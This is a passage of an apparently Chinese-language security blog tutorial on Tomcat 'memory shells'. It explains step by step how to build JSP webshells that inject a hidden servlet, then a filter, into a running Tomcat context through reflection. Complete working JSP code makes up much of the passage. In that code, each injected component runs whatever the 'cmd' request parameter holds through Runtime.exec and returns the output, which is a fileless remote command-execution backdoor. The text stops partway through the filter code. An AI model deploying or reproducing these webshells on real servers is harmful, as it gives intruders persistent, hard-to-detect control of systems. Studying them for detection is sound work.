%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletURL</span> <span class="operator">=</span> <span class="string">&quot;/&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;Servlet&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;&#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c &quot;</span> + cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        standardContext.addServletMappingDecoded(servletURL, servletName);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="string">&quot;?cmd=echo 世界，你好！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">outError</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        outError.println(<span class="string">&quot;Error: &quot;</span> + errorMessage);</span><br><span class="line">        outError.flush();</span><br><span class="line">        outError.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116000634170.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116001219456.png"></p><p>访问，执行任意命令：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116001239119.png"></p><h3 id="3-1-2-servlet内存马demo代码分析"><a href="#3-1-2-servlet内存马demo代码分析" class="headerlink" title="3.1.2 servlet内存马demo代码分析"></a>3.1.2 servlet内存马demo代码分析</h3><p>先完成第一个任务：找到<code>StandardContext</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><p>首先得知道<code>Field</code>是什么。在<code>Java</code>中，<code>Field</code>这个类属于<code>java.lang.reflect</code>包，用于表示类的成员变量（字段）。<code>Field</code>类提供了访问和操作类的字段的方法，包括获取字段的名称、类型、修饰符等信息，以及在实例上获取或设置字段的值。这样我们就可以实现在运行时动态获取类的信息，绕过一些访问修饰符的限制，访问和操作类的私有成员。</p><p>所以上述代码的含义就是：从当前<code>HttpServletRequest</code>中获取<code>ServletContext</code>对象，然后使用反射机制获取<code>ServletContext</code>类中名为<code>context</code>的私有字段，并赋值给<code>Field</code>类型的变量<code>appctx</code>，把这个变量的属性设置为可访问，这样我们后续可以通过反射获取它的值。接着通过反射获取<code>ServletContext</code>对象的私有字段<code>context</code>的值，并将其强制类型转换为<code>ApplicationContext</code>。接下来继续使用反射机制获取<code>ApplicationContext</code>类中名为<code>context</code>的私有字段，并赋值给<code>Field</code>类型的变量<code>stdctx</code>，同样将其设置为可访问；最后通过反射获取<code>ApplicationContext</code>对象的私有字段<code>context</code>的值，并将其强制类型转换为<code>StandardContext</code>，到这里，我们就成功找到了<code>StandardContext</code>。</p><p>接着完成第二个任务：继承并编写一个恶意<code>servlet</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c &quot;</span> + cmd).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，除了<code>service</code>代码之外，我们还编写了<code>init</code>、<code>getServletConfig</code>、<code>getServletInfo</code>和<code>destroy</code>方法，可是它们并没有用到，要么返回<code>null</code>，要么直接留空不写，那我们为什么还要写这四个方法呢？</p><p>那我们就来试试看注释掉之后会怎么样：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116141041681.png"></p><p>报错：<code>Class &#39;Anonymous class derived from Servlet&#39; must implement abstract method &#39;init(ServletConfig)&#39; in &#39;Servlet&#39;</code>。</p><p>我们直接跟进<code>Servlet</code>类，可以看到其是一个接口：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116141210781.png"></p><p>原来，在<code>Java</code>中，接口中的方法默认都是抽象的，除非在<code>Java 8</code>及以后的版本中使用了默认方法。并且，如果一个类实现了某个接口，那么它必须提供该接口中所有抽象方法的具体实现，这就是我们必须要写出上述四个方法的原因。</p><p>这里我使用<code>cmd /c</code>来实现可以执行带有空格的命令，例如我在<code>3.1.1</code>中举例的<code>echo 世界，你好！</code>；对于<code>Linux</code>系统，那就是<code>/bin/sh -c</code>；接着就是关于输入或者返回结果中带有中文的情况的处理，我们需要设置编码为<code>GBK</code>即可，当然这个就需要具体情况具体对待了。</p><p>接着我们需要完成后续的六个任务：创建<code>Wapper</code>对象、设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值、设置<code>Servlet</code>的<code>Name</code>、设置<code>Servlet</code>对应的<code>Class</code>、将<code>Servlet</code>添加到<code>context</code>的<code>children</code>中、将<code>url</code>路径和<code>servlet</code>类做映射，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setName(servletName);</span><br><span class="line">wrapper.setServlet(servlet);</span><br><span class="line">wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(servletURL, servletName);</span><br></pre></td></tr></table></figure><p>前面几步在之前已经讲过了，这个<code>standardContext.addChild(wrapper);</code>是为了让我们自定义的<code>servlet</code>成为<code>Web</code>应用程序的一部分；然后<code>standardContext.addServletMappingDecoded(servletURL, servletName);</code>也可以写成如下形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要引入：&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationServletRegistration&quot; %&gt;</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">dynamic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationServletRegistration</span>(wrapper, standardContext);</span><br><span class="line">dynamic.addMapping(servletURL);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116143224121.png"></p><h3 id="3-1-3-关于StandardContext、ApplicationContext、ServletContext的理解"><a href="#3-1-3-关于StandardContext、ApplicationContext、ServletContext的理解" class="headerlink" title="3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解"></a>3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解</h3><p>请参考<code>Skay</code>师傅和<code>yzddmr6</code>师傅的文章，他们写的非常详细，这里直接贴出链接：</p><blockquote><p><a href="https://yzddmr6.com/posts/tomcat-context/">https://yzddmr6.com/posts/tomcat-context/</a></p><p><a href="https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</a></p></blockquote><p>引用<code>Skay</code>师傅的一句话总结：</p><p><code>ServletContext</code>是<code>Servlet</code>规范；<code>org.apache.catalina.core.ApplicationContext</code>是<code>ServletContext</code>的实现；<code>org.apache.catalina.Context</code>接口是<code>tomcat</code>容器结构中的一种容器，代表的是一个<code>web</code>应用程序，是<code>tomcat</code>独有的，其标准实现是<code>org.apache.catalina.core.StandardContext</code>，是<code>tomcat</code>容器的重要组成部分。</p><p>关于<code>StandardContext</code>的获取方法，除了本文中提到的将我们的<code>ServletContext</code>转为<code>StandardContext</code>从而获取<code>context</code>这个方法，还有以下两种方法：</p><blockquote><ol><li>从线程中获取StandardContext，参考Litch1师傅的文章：<a href="https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A">https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A</a></li><li>从MBean中获取，参考54simo师傅的文章：<a href="https://scriptboy.cn/p/tomcat-filter-inject/%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%99%E4%BD%8D%E5%B8%88%E5%82%85%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%B7%B2%E7%BB%8F%E5%85%B3%E9%97%AD%E4%BA%86%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%AD%98%E6%A1%A3%EF%BC%9Ahttps://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/，不过这位师傅的博客已经关闭了，我们可以看存档：https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/</a></li><li>从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：<a href="https://www.anquanke.com/post/id/198886">https://www.anquanke.com/post/id/198886</a></li></ol></blockquote><p>这两种方法，如果后面有时间的话我会补充完整。</p><h2 id="3-2-Filter内存马"><a href="#3-2-Filter内存马" class="headerlink" title="3.2 Filter内存马"></a>3.2 Filter内存马</h2><h3 id="3-2-1-简单的filter内存马demo编写"><a href="#3-2-1-简单的filter内存马demo编写" class="headerlink" title="3.2.1 简单的filter内存马demo编写"></a>3.2.1 简单的filter内存马demo编写</h3><p>根据我们在上面的<code>2.6</code>节中所讨论的内容，我们可以得出以下结论：</p><p>如果我们想要写一个<code>Filter</code>内存马，需要经过以下步骤：</p><blockquote><p>参考：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/">https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/</a></p></blockquote><ul><li>获取<code>StandardContext</code>；</li><li>继承并编写一个恶意<code>filter</code>；</li><li>实例化一个<code>FilterDef</code>类，包装<code>filter</code>并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个<code>FilterMap</code>类，将我们的<code>Filter</code>和<code>urlpattern</code>相对应，使用<code>addFilterMapBefore</code>存放到<code>StandardContext.filterMaps</code>中；</li><li>通过反射获取<code>filterConfigs</code>，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到<code>filterConfig</code>中。</li></ul><blockquote><p>参考：<a href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">https://tyaoo.github.io/2021/12/06/Tomcat内存马/</a></p></blockquote><p>需要注意的是，一定要先修改<code>filterDef</code>，再修改<code>filterMap</code>，不然会抛出找不到<code>filterName</code>的异常。</p><p>由以上结论我们可以写出如下内存马<code>demo</code>：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> getRandomString();</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c &quot;</span> + cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        